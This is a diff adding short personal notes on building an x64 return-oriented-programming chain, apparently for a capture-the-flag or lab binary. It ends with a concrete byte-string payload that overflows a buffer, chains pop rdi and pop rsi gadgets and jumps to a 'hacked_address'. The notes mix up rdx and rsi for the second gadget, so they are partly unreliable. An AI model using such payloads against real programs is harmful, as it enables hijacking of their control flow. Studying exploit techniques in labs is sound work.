@@ -1,0 +1,25 @@
+
+64 bit (x64):
+
+block_ptr_manipulation + rdi instruction + rdi value + rdx instruction + rdx value + hacked_address
+
+this depends on what the ropper gives us as suitable instructions, this is assuming we get the following...
+
+rdi instruction:
+	pop, rdi
+	ret
+
+rdx instrution:
+	pop, rdx
+	ret
+
+
+rdi = param 1 = 0xdeadbeefdeadbeef
+
+rsi = param 2 = 0xc0debabec0debabe
+
+
+
+'aaaaaaaabaaaaaaacaaaaaaa' + '\x4b\x12\x40\x00\x00\x00\x00\x00' + '\xef\xbe\xad\xde\xef\xbe\xad\xde' + '\x49\x12\x40\x00\x00\x00\x00\x00' + '\xbe\xba\xde\xc0\xbe\xba\xde\xc0' + '\x00\x00\x00\x00\x00\x00\x00\x00' + '\x42\x11\x40\x00\x00\x00\x00\x00'
+
+junk + pop_rdi address + deadbeef + pop_rsi address + junk + hacked_address
